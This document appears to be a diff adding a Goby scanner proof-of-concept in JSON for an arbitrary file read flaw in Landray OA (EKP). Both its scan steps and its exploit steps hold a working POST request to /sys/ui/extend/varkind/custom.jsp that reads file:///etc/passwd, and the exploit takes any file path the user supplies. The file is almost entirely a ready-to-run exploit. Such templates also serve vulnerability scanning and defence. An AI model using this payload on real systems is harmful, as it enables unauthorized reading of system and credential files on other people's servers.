@@ -1,0 +1,86 @@
+{
+      "Name": "landray-OA-Arbitrary-file-read",
+      "Level": "3",
+      "Tags": [],
+      "GobyQuery": "app=\"landray-OA\"",
+      "Description": "深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。",
+      "Product": "",
+      "Homepage": "https://github.com/adminwaf/goby_exp/",
+      "Author": "https://github.com/adminwaf/goby_exp/",
+      "Impact": "",
+      "Recommandation": "<p>undefined</p>",
+      "References": [
+            "https://github.com/adminwaf/goby_exp/"
+      ],
+      "HasEXp":true,
+      "ExpParams": [
+       {
+        "name": "查看",
+        "type": "input",
+        "value": "/etc/passwd",
+        "show": ""
+        }
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/sys/ui/extend/varkind/custom.jsp",
+                        "follow_redirect": false,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+                              "Content-Length": "42",
+                              "Content-Type": "application/x-www-form-urlencoded",
+                              "Accept-Encoding": "gzip"
+                        },
+                        "data_type": "text",
+                        "data": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+          "Exploitsteps":[
+      		"AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/sys/ui/extend/varkind/custom.jsp",
+                        "follow_redirect": false,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+                              "Content-Length": "42",
+                              "Content-Type": "application/x-www-form-urlencoded",
+                              "Accept-Encoding": "gzip"
+                        },
+                        "data_type": "text",
+                        "data": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
+                  },
+                "SetVariable": [
+            	"output|lastbody"
+            ]
+        }
+      ],
+      "PostTime": "2021-05-15 16:12:27",
+      "GobyVersion": "1.8.268"
+}
